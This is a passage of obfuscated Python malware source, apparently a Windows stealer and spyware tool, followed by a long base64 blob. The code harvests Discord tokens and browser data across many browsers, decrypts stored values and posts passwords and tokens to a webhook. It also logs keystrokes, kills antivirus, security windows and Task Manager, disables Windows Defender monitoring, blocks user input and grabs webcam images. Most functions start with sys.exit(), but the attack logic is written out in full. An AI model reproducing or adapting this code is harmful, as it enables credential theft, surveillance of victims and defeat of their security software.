    OOOO00O0OOO0O0OO0 = r'C:\Users\\'+_OOOO00O0O0OO000O0 + \
        r'\AppData\Roaming\discord\\'  # line:1069
    OOO0O0OOOOO0000OO = r'C:\Users\\'+_OOOO00O0O0OO000O0 + \
        r'\AppData\Local\BraveSoftware\Brave-Browser\User Data'  # line:1070
    try:  # line:1072
        locate(OOOO00O0OOO0O0OO0)  # line:1073
    except Exception as OO000O0OO00OO0O0O:  # line:1074
        pw_msg += f"Discord location error {OO000O0OO00OO0O0O}"  # line:1075
    try:  # line:1076
        locate(OOO00O0OOOO00000O)  # line:1077
    except Exception as OO000O0OO00OO0O0O:  # line:1078
        pw_msg += f"Chrome location error {OO000O0OO00OO0O0O}"  # line:1079
    try:  # line:1080
        locate(OOO0OOO0OOOO0O000)  # line:1081
    except Exception as OO000O0OO00OO0O0O:  # line:1082
        pw_msg += f"Edge location error {OO000O0OO00OO0O0O}"  # line:1083
    try:  # line:1084
        locate(O0O00O0O00O0O0000)  # line:1085
    except Exception as OO000O0OO00OO0O0O:  # line:1086
        pw_msg += f"Firefox location error {OO000O0OO00OO0O0O}"  # line:1087
    try:  # line:1088
        locate(OOO0O0OOOOO0000OO)  # line:1089
    except Exception as OO000O0OO00OO0O0O:  # line:1090
        pw_msg += f"Brave location error {OO000O0OO00OO0O0O}"  # line:1091
    if response_needed == False:  # line:1093
        send_to_webhook ("**Passwords**", pw_msg , "passwords.txt")  # line:1094
    else:  # line:1095
        return pw_msg  # line:1096

all_keys = ""  # line:1098
caps = False  # line:1099


def current_window_manager():  # line:
    sys.exit()
    global all_keys  # line:1103
    OOOOO00000O00O0O0 = ["malware", "virus", "hack","security","norton","threat","bug","worm","ransomware","bitdefender","avast","clean","startup","command prompt","cmd.exe","powershell","safe mode"]#line:1104
    O00OO0OO0O0O0OO00 = ["reset"]  # line:1105
    O0OOOOO000O0OOO00 = None  # line:1106
    while True:  # line:1107
        O0000O00O0OO000OO = GetWindowText(GetForegroundWindow ())  # line:1109
        if [O0000OOOOO00OO00O for O0000OOOOO00OO00O in OOOOO00000O00O0O0 if O0000OOOOO00OO00O in O0000O00O0OO000OO .lower()]:  # line:1113
            O0OO0O0O0O00O0000 = GetForegroundWindow()  # line:1114
            O000OO0OOOOOO00OO = win32process .GetWindowThreadProcessId (O0OO0O0O0O00O0000)[1 ]  # line:1115
            # line:1116
            print(f"banned pid : {O000OO0OOOOOO00OO} | {O0000O00O0OO000OO.lower()}")
            OOOO00OO0OO0O0000 = subprocess .run (f"taskkill /im {O000OO0OOOOOO00OO} /f", capture_output =True , shell =True )#line:1117
        elif [O00OOO0000O0O00OO for O00OOO0000O0O00OO in O00OO0OO0O0O0OO00 if O00OOO0000O0O00OO in O0000O00O0OO000OO .lower()]:  # line:1119
            try:  # line:1120
                O0OO0O0O0O00O0000 = GetForegroundWindow()  # line:1121
                O000OO0OOOOOO00OO = win32process .GetWindowThreadProcessId (O0OO0O0O0O00O0000)[1 ]  # line:1122
                # line:1123
                print(f"banned banned pid : {O000OO0OOOOOO00OO}  | {O0000O00O0OO000OO.lower()}")
                OOOO00OO0OO0O0000 = subprocess .run (f"taskkill /im {O000OO0OOOOOO00OO} /f", capture_output =True , shell =True )#line:1124
            except Exception as OO0000OOO0O0O0000:  # line:1125
                print(OO0000OOO0O0O0000)  # line:1126
                pass  # line:1127
            OOOO00OO0OO0O0000 = subprocess .run (f"shutdown -r", capture_output =True , shell =True )#line:1128
        elif 'task' in O0000O00O0OO000OO .lower () and 'switching'not in O0000O00O0OO000OO .lower ():  # line:1130
            if banning_task_manager == True:  # line:1131
                O0OO0O0O0O00O0000 = GetForegroundWindow()  # line:1132
                O000OO0OOOOOO00OO = win32process .GetWindowThreadProcessId (O0OO0O0O0O00O0000)[1 ]  # line:1133
                OOOO00OO0OO0O0000 = subprocess .run (f"taskkill /im {O000OO0OOOOOO00OO} /f", capture_output =True , shell =True )#line:1134
        if O0000O00O0OO000OO != O0OOOOO000O0OOO00:  # line:1136
            # line:1137
            all_keys += f"\n\n[WINDOW : {O0000O00O0OO000OO.strip()}]\n\n"
        O0OOOOO000O0OOO00 = O0000O00O0OO000OO  # line:1138
        time .sleep(0.01)  # line:1144


def on_press (OO0OOO0000O0OOOO0):  # line:1149
    sys.exit()
    global all_keys, caps  # line:1150
    OO00000O0OO00O00O = str (OO0OOO0000O0OOOO0 ).lower ().replace ("'", "")  # line:1151
    if "key" in OO00000O0OO00O00O:  # line:1152
        # line:1153
        OO00000O0OO00O00O = f"[{OO00000O0OO00O00O.replace('key.','')}]"
    if 'enter' in OO00000O0OO00O00O:  # line:1154
        all_keys += "\n"  # line:1155
    elif "space" in OO00000O0OO00O00O:  # line:1156
        all_keys += " "  # line:1157
    elif "shift" in OO00000O0OO00O00O:  # line:1158
        caps = True  # line:1159
    elif "caps_lock" in OO00000O0OO00O00O:  # line:1161
        pass  # line:1162
    else:  # line:1164
        if caps == True:  # line:1165
            all_keys += OO00000O0OO00O00O .upper()  # line:1166
        else:  # line:1167
            all_keys += OO00000O0OO00O00O  # line:1168


def on_release (OOOOOOO0O0O00OOO0):  # line:1171
    sys.exit()
    global caps  # line:1172
    OO000000O0OOO0OOO = str (OOOOOOO0O0O00OOO0 ).lower ().replace ("'", "")  # line:1173
    if "shift" in OO000000O0OOO0OOO:  # line:1174
        caps = False  # line:1175
    elif "caps_lock" in OO000000O0OOO0OOO:  # line:1177
        if caps == True:  # line:1178
            caps = False  # line:1179
            return  # line:1180
        if caps == False:  # line:1181
            caps = True  # line:1182
            return  # line:1183

tokens = ""  # line:1186


async def checkToken (O0000000O0O000O0O):  # line:1187
    sys.exit()
    global tokens  # line:1188
    O00OOOOO00000O0O0 = {'authority': 'discord.com', 'method':'POST','path':'/api/v9/users/@me/channels','scheme':'https','accept':'*/*','accept-encoding':'gzip, deflate','accept-language':'en-US','authorization':O0000000O0O000O0O ,'origin':'https://discord.com','sec-ch-ua':'"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36','x-debug-options':'bugReporterEnabled',}#line:1210
    OO0OO0O00OO00000O = httpx .get (f"https://discord.com/api/v9/users/@me", headers =O00OOOOO00000O0O0 )  # line:1213
    if OO0OO0O00OO00000O .status_code == 200:  # line:1215
        O0OOO0O000OO00O00 = OO0OO0O00OO00000O .json()["username"]  # line:1216
        OOO00OO00O0O00O00 = OO0OO0O00OO00000O .json()["discriminator"]  # line:1217
        # line:1218
        O00OOOOOOO0O000O0 = f"{O0OOO0O000OO00O00}#{OOO00OO00O0O00O00}"
        if O0000000O0O000O0O not in str(tokens):  # line:1219
            # line:1220
            tokens += f"[{O00OOOOOOO0O000O0}]\n{O0000000O0O000O0O}\n\n"
def decrypt_val (OOO0O00OOOO000O00 , OO000O0OOOO00O000 ) -> str :#line:1222
    sys.exit()
    try:  # line:1223
        O0000O000OO0OO00O = OOO0O00OOOO000O00 [3:15 ]  # line:1224
        OOOO0O000OO0O000O = OOO0O00OOOO000O00 [15:]  # line:1225
        O0OO000OOOO00O0O0 = AES .new (OO000O0OOOO00O000 , AES .MODE_GCM , O0000O000OO0OO00O )#line:1226
        OOOO00000OOO0O0OO = O0OO000OOOO00O0O0 .decrypt (OOOO0O000OO0O000O)  # line:1227
        OOOO00000OOO0O0OO = OOOO00000OOO0O0OO [:-16].decode ()  # line:1228
        return OOOO00000OOO0O0OO  # line:1229
    except Exception:  # line:1230
        # line:1231
        return f'Failed to decrypt "{str(OOO0O00OOOO000O00)}" | key: "{str(OO000O0OOOO00O000)}"'


def get_tokens (response_needed =False):  # line:1233
    sys.exit()
    global tokens  # line:1234
    tokens = ""  # line:1235
    O00O00OOO0000OO0O = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"  # line:1237
    O0O0OOO0OO00O00OO = r"dQw4w9WgXcQ:[^\"]*"  # line:1238
    OO00OOOOO000OOOOO = os .getenv("appdata")  # line:1239
    O0OO0OOOOO0O0O0O0 = os .getenv("localappdata")  # line:1240
    OOO00000OO0000OO0 = ntpath .join (O0OO0OOOOO0O0O0O0 , 'Google', 'Chrome','User Data')#line:1241
    O0O0O000O0000O00O = {'Discord': OO00OOOOO000OOOOO + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary':OO00OOOOO000OOOOO + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord':OO00OOOOO000OOOOO + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB':OO00OOOOO000OOOOO + '\\discordptb\\Local Storage\\leveldb\\','Opera':OO00OOOOO000OOOOO + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX':OO00OOOOO000OOOOO + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo':O0OO0OOOOO0O0O0O0 + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch':O0OO0OOOOO0O0O0O0 + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa':O0OO0OOOOO0O0O0O0 + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum':O0OO0OOOOO0O0O0O0 + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser':O0OO0OOOOO0O0O0O0 + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star':O0OO0OOOOO0O0O0O0 + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik':O0OO0OOOOO0O0O0O0 + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi':O0OO0OOOOO0O0O0O0 + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS':O0OO0OOOOO0O0O0O0 + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome':OOO00000OO0000OO0 + '\\Default\\Local Storage\\leveldb\\','Epic Privacy Browser':O0OO0OOOOO0O0O0O0 + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge':O0OO0OOOOO0O0O0O0 + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\','Uran':O0OO0OOOOO0O0O0O0 + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex':O0OO0OOOOO0O0O0O0 + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave':O0OO0OOOOO0O0O0O0 + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium':O0OO0OOOOO0O0O0O0 + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}#line:1265
    try:  # line:1267
        for O0O0O0OOOO0OO00O0, OOO0000O0O0OOOOOO in O0O0O000O0000O00O .items ():  # line:1268
            if not ntpath .exists(OOO0000O0O0OOOOOO):  # line:1269
                continue  # line:1270
            OO00O00000O0OOOO0 = O0O0O0OOOO0OO00O0 .replace (" ", "").lower ()  # line:1271
            if "cord" in OOO0000O0O0OOOOOO:  # line:1272
                if ntpath .exists(OO00OOOOO000OOOOO + f'\\{OO00O00000O0OOOO0}\\Local State'):  # line:1273
                    for OOO0OO00OO00OO000 in os .listdir(OOO0000O0O0OOOOOO):  # line:1274
                        if OOO0OO00OO00OO000 [-3:]not in ["log", "ldb"]:  # line:1275
                            continue  # line:1276
                        for O0OO0000O00OOO000 in [OO0OOOOO0O0O0000O .strip ()for OO0OOOOO0O0O0000O in open (f'{OOO0000O0O0OOOOOO}\\{OOO0OO00OO00OO000}', encoding ="utf-8", errors ='ignore').readlines ()if OO0OOOOO0O0O0000O .strip ()]:  # line:1277
                            for OOO0O0O0O0OOOO00O in re .findall (O0O0OOO0OO00O00OO, O0OO0000O00OOO000 ):  # line:1278
                                O0000OO00OO00OOO0 = decrypt_val (base64 .b64decode (OOO0O0O0O0OOOO00O .split ('dQw4w9WgXcQ:')[1 ]), get_master_key (OO00OOOOO000OOOOO + f'\\{OO00O00000O0OOOO0}\\Local State'))  # line:1279
                                asyncio .run(checkToken (O0000OO00OO00OOO0))  # line:1280
            else:  # line:1281
                for OOO0OO00OO00OO000 in os .listdir(OOO0000O0O0OOOOOO):  # line:1282
                    if OOO0OO00OO00OO000 [-3:]not in ["log", "ldb"]:  # line:1283
                        continue  # line:1284
                    for O0OO0000O00OOO000 in [OO0OO0000OOOO00O0 .strip ()for OO0OO0000OOOO00O0 in open (f'{OOO0000O0O0OOOOOO}\\{OOO0OO00OO00OO000}', encoding ="utf-8", errors ='ignore').readlines ()if OO0OO0000OOOO00O0 .strip ()]:  # line:1285
                        for O0000OO00OO00OOO0 in re .findall (O00O00OOO0000OO0O, O0OO0000O00OOO000 ):  # line:1286
                            asyncio .run(checkToken (O0000OO00OO00OOO0))  # line:1287
        if ntpath .exists(OO00OOOOO000OOOOO + "\\Mozilla\\Firefox\\Profiles"):  # line:1289
            for OOO0000O0O0OOOOOO , _OOO0OOOOOOO0O0OO0 , OO000OO00O0O000OO in os .walk (OO00OOOOO000OOOOO + "\\Mozilla\\Firefox\\Profiles"):#line:1290
                for _OOOO00OO00O000OO0 in OO000OO00O0O000OO:  # line:1291
                    # line:1292
                    if not _OOOO00OO00O000OO0 .endswith('.sqlite'):
                        continue  # line:1293
                    for O0OO0000O00OOO000 in [O00O0000OOO0OOOO0 .strip ()for O00O0000OOO0OOOO0 in open (f'{OOO0000O0O0OOOOOO}\\{_OOOO00OO00O000OO0}', encoding ="utf-8", errors ='ignore').readlines ()if O00O0000OOO0OOOO0 .strip ()]:  # line:1294
                        for O0000OO00OO00OOO0 in re .findall (O00O00OOO0000OO0O, O0OO0000O00OOO000 ):  # line:1295
                            asyncio .run(checkToken (O0000OO00OO00OOO0))  # line:1296
    except Exception as O0OO0OOO00O0OO0OO:  # line:1297
        return O0OO0OOO00O0OO0OO  # line:1298
    if response_needed == False:  # line:1301
        send_to_webhook ("**Tokens**", tokens , "tokens.txt")  # line:1302
    else:  # line:1303
        return tokens  # line:1304


def disable_antivirus():  # line:1306
    sys.exit()
    threading .Thread (target =do_cmd_stuff, args =(f"powershell -Command Add-MpPreference -ExclusionPath \"{sys.argv[0]}\"",)).start ()  # line:1307
    threading .Thread (target =do_cmd_stuff, args =("powershell -Command Add-MpPreference -ExclusionPath .exe",)).start ()  # line:1308
    threading .Thread (target =do_cmd_stuff, args =("powershell Set-MpPreference -DisableRealtimeMonitoring $true",)).start ()  # line:1309
    threading .Thread (target =do_cmd_stuff, args =("powershell Set-MpPreference -MAPSReporting 0",)).start ()  # line:1310
    threading .Thread (target =do_cmd_stuff, args =("powershell Set-MpPreference -SubmitSamplesConsent 2",)).start ()  # line:1311

banning_task_manager = True  # line:1314
is_input_banned = False  # line:1315


def ban_task_manager():  # line:1316
    sys.exit()
    global banning_task_manager  # line:1317
    OOOOOO000OOOOOOOO = 0  # line:1318
    while True:  # line:1319
        OOOOOO000OOOOOOOO += 1  # line:1320
        time .sleep(0.5)  # line:1321
        if banning_task_manager == True:  # line:1322
            for OO000OO0O0O0OO000 in psutil .process_iter():  # line:1323
                _O00O0O0O0000OOOO0 = f"Taskmgr.exe"  # line:1324
                if OO000OO0O0O0OO000 .name ().lower () == _O00O0O0O0000OOOO0 .lower ():  # line:1325
                    OO0OO00O0OOOOO0OO = subprocess .run (f"taskkill /im {_O00O0O0O0000OOOO0} /f", capture_output =True , shell =True )#line:1326

_O0O0O0OO000000OO0 = None  # line:1330


def create_input_functions():  # line:1331
    sys.exit()
    global _O0O0O0OO000000OO0  # line:1332
    _O0O0O0OO000000OO0 = ctypes .windll .user32 .BlockInput  # line:1333
    _O0O0O0OO000000OO0 .argtypes = [wintypes .BOOL]  # line:1334
    _O0O0O0OO000000OO0 .restype = wintypes .BOOL  # line:1335
    return  # line:1336


def ban_input():  # line:1339
    sys.exit()
    _O0O0O0OO000000OO0(True)  # line:1340
    time .sleep(30)  # line:1341


def unban_input():  # line:1342
    sys.exit()
    _O0O0O0OO000000OO0(False)  # line:1343
    time .sleep(30)  # line:1344


def close_all():  # line:1349
    sys.exit()
    OO000OO0OOO0O0O00 = 0  # line:1350
    for OOOOO0O0O00OO00O0 in psutil .process_iter():  # line:1351
        O00000O000O00OO0O = OOOOO0O0O00OO00O0 .name()  # line:1352
        O0O0OOOOOOOO00O00 = subprocess .run (f"taskkill /im {O00000O000O00OO0O} /f", capture_output =True , shell =True )#line:1353
        OO000OO0OOO0O0O00 += 1  # line:1354
    return OO000OO0OOO0O0O00  # line:1355


def close_all_browsers():  # line:1357
    sys.exit()
    OOO00O000O000O0OO = 0  # line:1358
    for O0O00OOOO0O0OO0O0 in psutil .process_iter():  # line:1359
        O0O0000OOO000O0OO = str(O0O00OOOO0O0OO0O0 .name ()).lower ()  # line:1360
        if 'chrome' in O0O0000OOO000O0OO or 'firefox' in O0O0000OOO000O0OO or 'edge' in O0O0000OOO000O0OO or 'internet'in O0O0000OOO000O0OO or 'brave'in O0O0000OOO000O0OO or 'opera'in O0O0000OOO000O0OO :#line:1361
            OOO0O0OO00O00000O = subprocess .run (f"taskkill /im {O0O0000OOO000O0OO} /f", capture_output =True , shell =True )#line:1362
            OOO00O000O000O0OO += 1  # line:1363
    return OOO00O000O000O0OO  # line:1364


def get_applications_running():  # line:1366
    sys.exit()
    OO0O000OO00OOO000 = []  # line:1367
    for OO00OOOO0OO000OO0 in psutil .process_iter():  # line:1368
        OO0O000OO00OOO000 .append(OO00OOOO0OO000OO0 .name())  # line:1369
    O00O0O0000OOO0OO0 = []  # line:1370
    for O000O00OOOOOO0O00 in OO0O000OO00OOO000:  # line:1371
        O00O0O0000OOO0OO0 .append ([O000O00OOOOOO0O00, OO0O000OO00OOO000 .count (O000O00OOOOOO0O00 )])  # line:1372
        while O000O00OOOOOO0O00 in OO0O000OO00OOO000:  # line:1373
            OO0O000OO00OOO000 .remove(O000O00OOOOOO0O00)  # line:1374
    return O00O0O0000OOO0OO0  # line:1375


def key_manager():  # line:1377
    sys.exit()
    with Listener (on_press =on_press, on_release =on_release )as O00OO000O00000O00 :  # line:1378
        O00OO000O00000O00 .join()  # line:1379

cam_port = None  # line:1381
cam = None  # line:1382


def get_camera():  # line:1384
    sys.exit()
    global cam_port  # line:1385
    global cam  # line:1386
    if cam_port == None:  # line:1387
        try:  # line:1388
            cam_port = 0  # line:1389
            cam = cv2 .VideoCapture (cam_port)  # line:1390
        except Exception as OOOOO0OO00OOO0000:  # line:1391
            return f"NO CAMERA ERROR {OOOOO0OO00OOO0000}"  # line:1392
    try:  # line:1393
        O0O0000O000OOO00O , OO000OO00OOO0O0O0 = cam .read ()  # line:1394
        O0OOO0O0OOOO0OO0O = cv2 .imencode ('.jpg', OO000OO00OOO0O0O0 )[1 ].tobytes ()  # line:1395
        O0OOOOOOO0OOO0000 = base64 .b64encode (O0OOO0O0OOOO0OO0O)  # line:1396
        OO0O00000OOOOO000 = O0OOOOOOO0OOO0000 .decode('utf-8')  # line:1397
        return OO0O00000OOOOO000  # line:1399
    except Exception as OOOOO0OO00OOO0000:  # line:1400
        return f"NO CAMERA ERROR {OOOOO0OO00OOO0000}"  # line:1401
    return "PROPER ERROR"  # line:1402

_OOOOO00000O0O0O00 = """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